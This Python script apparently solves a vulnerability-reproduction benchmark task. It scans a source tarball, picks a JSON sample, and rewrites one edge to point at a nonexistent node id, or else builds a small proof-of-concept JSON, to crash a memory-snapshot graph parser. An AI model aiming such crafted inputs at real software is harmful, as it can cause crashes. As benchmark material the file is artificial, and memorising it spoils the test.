import tarfile
import json
import re
from collections import defaultdict

MAX_CODE_SIZE = 512 * 1024
MAX_JSON_SIZE = 2 * 1024 * 1024


def extract_code_keywords_and_literals(tar, members):
    keywords = set()
    string_literals = set()
    code_exts = ('.c', '.cc', '.cpp', '.cxx', '.h', '.hh', '.hpp', '.hxx', '.ipp')

    for m in members:
        if not m.isfile():
            continue
        name_lower = m.name.lower()
        if not name_lower.endswith(code_exts):
            continue
        if m.size <= 0:
            continue
        size = m.size if m.size < MAX_CODE_SIZE else MAX_CODE_SIZE
        f = tar.extractfile(m)
        if not f:
            continue
        try:
            data = f.read(size)
        finally:
            f.close()
        if not data:
            continue
        text = data.decode('utf-8', errors='ignore')
        if 'node_id_map' not in text and 'nodeidmap' not in text:
            continue

        # Path tokens as keywords
        path_tokens = re.split(r'[/:._\-]+', name_lower)
        for t in path_tokens:
            t = t.strip()
            if t and len(t) > 2:
                keywords.add(t)

        # Tokens around node_id_map
        for match in re.finditer(r'node_id_map', text):
            start = max(0, match.start() - 200)
            end = min(len(text), match.end() + 200)
            snippet = text[start:end]
            for tok in re.findall(r'[A-Za-z_]{3,}', snippet):
                keywords.add(tok.lower())

        # String literals (potential JSON keys)
        for s in re.findall(r'"([^"\n]{1,40})"', text):
            if not s:
                continue
            if any(c in s for c in '\\%'):
                continue
            string_literals.add(s)

    # Ensure some default keywords even if no node_id_map was found
    defaults = ['snapshot', 'memory', 'heap', 'graph', 'processor', 'dump',
                'node', 'nodes', 'edge', 'edges', 'trace', 'profile']
    keywords.update(defaults)
    return keywords, string_literals


def find_json_candidate(tar, members, keywords):
    candidates = []

    for m in members:
        if not m.isfile():
            continue
        if m.size <= 0 or m.size > MAX_JSON_SIZE:
            continue
        name_lower = m.name.lower()

        pref_score = 0
        if any(seg in name_lower for seg in ('test', 'fuzz', 'example', 'sample',
                                             'input', 'data', 'case', 'corpus')):
            pref_score += 1

        if not (name_lower.endswith('.json') or
                pref_score or
                any(kw in name_lower for kw in ('snapshot', 'heap', 'memory', 'graph', 'dump'))):
            continue

        f = tar.extractfile(m)
        if not f:
            continue
        try:
            raw = f.read()
        finally:
            f.close()
        if not raw:
            continue

        try:
            text = raw.decode('utf-8')
        except UnicodeDecodeError:
            continue

        if '{' not in text and '[' not in text:
            continue

        try:
            obj = json.loads(text)
        except Exception:
            continue

        score = 0
        score += pref_score * 2

        path_tokens = [t for t in re.split(r'[/:._\-]+', name_lower) if t]
        for t in path_tokens:
            if t in keywords:
                score += 3

        if any(w in name_lower for w in ('snapshot', 'heap', 'memory', 'graph', 'dump')):
            score += 4
        if 'node_id' in text or 'node id' in text:
            score += 4
        if 'nodes' in text and 'edges' in text:
            score += 3
        if 'snapshot' in text:
            score += 2

        score += max(0, (MAX_JSON_SIZE - len(raw)) // 10000)

        candidates.append((score, len(raw), m.name, obj))

    if not candidates:
        return None, None

    candidates.sort(key=lambda x: (-x[0], x[1]))
    best = candidates[0]
    return best[2], best[3]


def mutate_v8_snapshot(root):
    if not isinstance(root, dict):
        return False
    if 'snapshot' not in root or 'nodes' not in root or 'edges' not in root:
        return False

    snap = root.get('snapshot')
    nodes = root.get('nodes')
    edges = root.get('edges')
    if not isinstance(snap, dict) or not isinstance(nodes, list) or not isinstance(edges, list):
        return False

    meta = snap.get('meta')
    if not isinstance(meta, dict):
        return False

    node_fields = meta.get('node_fields')
    edge_fields = meta.get('edge_fields')
    if not isinstance(node_fields, list) or not isinstance(edge_fields, list):
        return False

    id_idx = -1
    for i, field in enumerate(node_fields):
        if not isinstance(field, str):
            continue
        fl = field.lower()
        if fl == 'id' or fl.endswith('_id'):
            id_idx = i
            break
    if id_idx == -1:
        return False

    to_idx = -1
    for i, field in enumerate(edge_fields):
        if not isinstance(field, str):
            continue
        fl = field.lower()
        if fl == 'to_node' or fl == 'target_node' or fl == 'to':
            to_idx = i
            break
    if to_idx == -1:
        return False

    node_field_count = len(node_fields)
    edge_field_count = len(edge_fields)
    if node_field_count <= id_idx or edge_field_count <= to_idx:
        return False
    if node_field_count == 0 or edge_field_count == 0:
        return False
    if not nodes:
        return False

    node_ids = []
    for i in range(0, len(nodes), node_field_count):
        if i + id_idx >= len(nodes):
            break
        val = nodes[i + id_idx]
        if isinstance(val, int):
            node_ids.append(val)
    if not node_ids:
        return False
    node_id_set = set(node_ids)
    bad_id = max(node_id_set) + 1

    changed = False
    for i in range(0, len(edges), edge_field_count):
        if i + to_idx >= len(edges):
            break
        val = edges[i + to_idx]
        if isinstance(val, int) and val in node_id_set:
            edges[i + to_idx] = bad_id
            changed = True
            break
    return changed


def collect_node_ids_and_defs(root):
    node_ids = set()
    node_def_positions = []

    def rec(o):
        if isinstance(o, dict):
            for k, v in o.items():
                kl = k.lower()
                if isinstance(v, int) and 'id' in kl:
                    node_ids.add(v)
                    node_def_positions.append((o, k))
                rec(v)
        elif isinstance(o, list):
            for item in o:
                rec(item)

    rec(root)
    return node_ids, node_def_positions


def collect_reference_counts(root, node_ids):
    ref_counts = defaultdict(int)
    node_ids_set = set(node_ids)

    def rec(o):
        if isinstance(o, dict):
            for k, v in o.items():
                if isinstance(v, int) and v in node_ids_set:
                    kl = k.lower()
                    if 'id' in kl:
                        continue
                    ref_counts[v] += 1
                rec(v)
        elif isinstance(o, list):
            for item in o:
                rec(item)

    rec(root)
    return ref_counts


def mutate_generic(root):
    node_ids, def_positions = collect_node_ids_and_defs(root)
    if not node_ids:
        return False

    ref_counts = collect_reference_counts(root, node_ids)
    candidates = [nid for nid in node_ids if ref_counts.get(nid, 0) > 0]
    if candidates:
        victim = candidates[0]
    else:
        victim = max(node_ids)

    new_id = max(node_ids) + 1
    changed = False
    for d, k in def_positions:
        if isinstance(d.get(k), int) and d[k] == victim:
            d[k] = new_id
            changed = True
    return changed


def mutate_json_for_node_id_bug(root):
    if isinstance(root, dict) and 'snapshot' in root and 'nodes' in root and 'edges' in root:
        if mutate_v8_snapshot(root):
            return True
    if mutate_generic(root):
        return True
    return False


def build_fallback_poc(string_literals):
    nodes_key = 'nodes'
    edges_key = 'edges'
    id_key = 'id'
    from_key = 'from'
    to_key = 'to'

    lower_map = {}
    for s in string_literals:
        sl = s.lower()
        if sl not in lower_map:
            lower_map[sl] = s

    if 'nodes' in lower_map:
        nodes_key = lower_map['nodes']
    elif 'node' in lower_map:
        nodes_key = lower_map['node']

    if 'edges' in lower_map:
        edges_key = lower_map['edges']
    elif 'edge' in lower_map:
        edges_key = lower_map['edge']

    if 'id' in lower_map:
        id_key = lower_map['id']
    elif 'node_id' in lower_map:
        id_key = lower_map['node_id']
    elif 'nodeid' in lower_map:
        id_key = lower_map['nodeid']

    for candidate in ('from', 'src', 'source', 'parent'):
        if candidate in lower_map:
            from_key = lower_map[candidate]
            break

    for candidate in ('to', 'dst', 'dest', 'target', 'child'):
        if candidate in lower_map:
            to_key = lower_map[candidate]
            break

    poc = {
        nodes_key: [{id_key: 1}, {id_key: 2}],
        edges_key: [{from_key: 1, to_key: 999999}]
    }
    return json.dumps(poc, separators=(',', ':')).encode('utf-8')


class Solution:
    def solve(self, src_path: str) -> bytes:
        string_literals = set()
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                members = tar.getmembers()
                keywords, string_literals = extract_code_keywords_and_literals(tar, members)
                _, root_obj = find_json_candidate(tar, members, keywords)
                if root_obj is not None:
                    if mutate_json_for_node_id_bug(root_obj):
                        return json.dumps(root_obj, separators=(',', ':')).encode('utf-8')
        except Exception:
            pass

        return build_fallback_poc(string_literals)